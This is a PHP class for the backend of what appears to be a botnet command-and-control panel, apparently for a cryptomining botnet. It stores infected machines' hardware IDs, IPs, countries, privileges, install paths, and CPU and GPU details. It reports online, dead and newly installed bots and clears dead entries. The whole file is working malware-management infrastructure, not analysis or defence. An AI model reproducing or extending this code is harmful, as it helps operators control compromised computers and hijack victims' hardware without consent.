<?php

class Bots{


    // database connection and table name
    private $conn;
    private $table_name = "bots";

    // object properties
    public $id;
    public $bothwid;
    public $ipaddress;
    public $country;
    public $installdate;
    public $lastresponse;
    public $currenttask;
    public $operatingsys;
    public $botversion;
    public $privileges;
    public $installationpath;
    public $computername;
    public $lastreboot;
    public $miningstatus;
    public $lastminerstart;
    public $cpu;
    public $gpu;
    public $mark;
 
    // constructor with $db as database connection
    public function __construct($db){
        $this->conn = $db;
    }


    function read(){
        $knock = $this->conn->query("SELECT knock FROM settings LIMIT 1")->fetchColumn(0) * 60;
 
        // select all query
        $query = "SELECT
                  * ,  IF(lastresponse + ".$knock." > UNIX_TIMESTAMP(), 'online', 'offline') AS status
                FROM
                    " . $this->table_name . " ";
     
        // prepare query statement
        $stmt = $this->conn->prepare($query);
     
        // execute query
        $stmt->execute();
     
        return $stmt;
    }

    public function stats(){
        include(__DIR__."/../assets/geo/geoip.inc");
        $gi = geoip_open(__DIR__."/../assets/geo/GeoIP.dat", "");
        $return = array();
        $return["knock"] = $this->conn->query("SELECT knock FROM settings LIMIT 1")->fetchColumn(0) * 60;
        $return["deadi"] = $this->conn->query("SELECT dead FROM settings LIMIT 1")->fetchColumn(0) * 86400;
        $o_sql = $this->conn->prepare("SELECT COUNT(*) FROM bots WHERE lastresponse + :on > UNIX_TIMESTAMP()");
        $o_sql->execute(array(":on" => $return["knock"] + 120));
        $d_sql = $this->conn->prepare("SELECT COUNT(*) FROM bots WHERE lastresponse + :d < UNIX_TIMESTAMP()");
        $d_sql->execute(array(":d" => $return["deadi"]));
        $return["online"] = number_format($o_sql->fetchColumn(0));
        $return["dead"] = number_format($d_sql->fetchColumn(0));
        $return["total"] = number_format($this->conn->query("SELECT COUNT(*) FROM bots")->fetchColumn(0));
        //Last 5 Installations
        $return["last5installs"] = array();
		if ($return["total"] != "0")
        {
            $bots = $this->conn->query("SELECT * FROM bots ORDER BY installdate DESC LIMIT 5");
            while ($b = $bots->fetch(PDO::FETCH_ASSOC))
            {
                $return["last5installs"][] = $b;
            }
        }else{
            echo "No data to display";
        }
        //Top 5 Countries
		if ($return["total"] != "0")
        {
            $osel =  $this->conn->query("SELECT operatingsys, COUNT(*) AS cnt FROM bots GROUP BY operatingsys ORDER BY cnt DESC LIMIT 5");
            while ($o = $osel->fetch())
            {
                $return["top5operatingsystems"][]  =  array("system"=> $o[0], "count" => number_format($o[1]));
            }
        }else{
            echo "No data to display";
        }
		if ($return["total"] != "0")
        {
            $csel =  $this->conn->query("SELECT country, COUNT(*) AS cnt FROM bots GROUP BY country ORDER BY cnt DESC LIMIT 5");
            while ($c = $csel->fetch())
            {
                $return["top5countries"][]  =  array("counrty"=>geoip_country_name_by_id($gi, $c[0]), "count" => number_format($c[1]));
            }
        }else{
            echo "No data to display";
        }
        //Privileges of Bots
        if ($return["total"] != "0")
        {
            $psel = $this->conn->query("SELECT privileges, COUNT(*) AS cnt FROM bots GROUP BY privileges ORDER BY cnt DESC");
            while ($p = $psel->fetch())
            {
                $return["botPrivileges"][$p[0]] =  $p[1];
            }
        }else{
            echo "No data to display";
        }
        //GPU Count of  Bots
        if ($return["total"] != "0")
        {
            $globalAMD = 0;
            $globalNVIDIA = 0;
            $globaldOnbloard = 0;
            $psel = $this->conn->query("SELECT gpu, COUNT(*) AS cnt FROM bots GROUP BY gpu ORDER BY cnt DESC");
            while ($p = $psel->fetch())
            {
                $return["gpuAll"][$p[0]] =  $p[1];
                
                if (strpos($p[0], 'NVIDIA') !== false) {
                    $globalNVIDIA++;
                }elseif (strpos($p[0], 'AMD') !== false){
                    $globalAMD++;
                }else{
                    $globaldOnbloard++;
                }
        
              
            }
            $return["gpuBrands"] =  array("AMD"=> $globalAMD, "NVIDIA" => $globalNVIDIA,"ONBOARD"=>$globaldOnbloard);
        }else{
            echo "No data to display";
        }

        return $return;
    }


    public function cleardeadbots(){

                // select all query


        $d = $this->conn->prepare("DELETE FROM bots WHERE lastresponse + :d < UNIX_TIMESTAMP()");
        $d->execute(array(":d" => $this->conn->query("SELECT dead FROM settings LIMIT 1")->fetchColumn(0) * 86400));
        $i = $this->conn->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, 'Cleared dead bots from table', UNIX_TIMESTAMP())");
        $i->execute(array(":u" => $_GET["username"], ":ip" => $_SERVER['REMOTE_ADDR']));

        return true;
    }
}